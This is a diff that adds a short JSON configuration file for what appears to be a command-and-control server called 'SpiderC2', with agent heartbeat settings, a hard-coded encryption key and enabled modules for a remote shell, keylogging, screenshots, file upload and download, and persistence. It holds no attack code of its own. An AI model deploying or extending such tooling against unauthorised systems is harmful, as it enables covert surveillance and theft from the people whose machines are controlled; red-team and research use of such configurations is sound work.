@@ -1,0 +1,25 @@
+{
+    "server": {
+        "host": "0.0.0.0",
+        "port": 8080,
+        "secret_key": "change_me_to_random_string"
+    },
+    "agents": {
+        "heartbeat_interval": 30,
+        "max_inactive_time": 300
+    },
+    "encryption": {
+        "enabled": true,
+        "key": "SpiderC2-2024-SecretKey!"
+    },
+    "modules": [
+        "shell",
+        "screenshot",
+        "keylogger",
+        "upload",
+        "download",
+        "persistence",
+        "sysinfo"
+    ],
+    "token_required": true
+}
